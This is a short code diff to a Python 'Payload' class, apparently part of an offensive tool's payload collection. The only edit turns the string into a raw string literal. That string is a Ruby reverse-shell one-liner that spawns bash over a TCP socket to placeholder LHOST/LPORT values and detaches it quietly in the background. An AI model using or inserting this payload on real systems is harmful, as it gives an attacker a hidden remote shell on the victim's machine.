@@ -23,5 +23,5 @@ class Payload:
 
     attrs = {}
 
-    data = "nohup ruby -rsocket -e 'spawn(\"bash\",[:in,:out,:err]=>TCPSocket.new(\"*LHOST*\",*LPORT*))' > /dev/null 2>&1 & disown"
+    data = r"nohup ruby -rsocket -e 'spawn(\"bash\",[:in,:out,:err]=>TCPSocket.new(\"*LHOST*\",*LPORT*))' > /dev/null 2>&1 & disown"
     
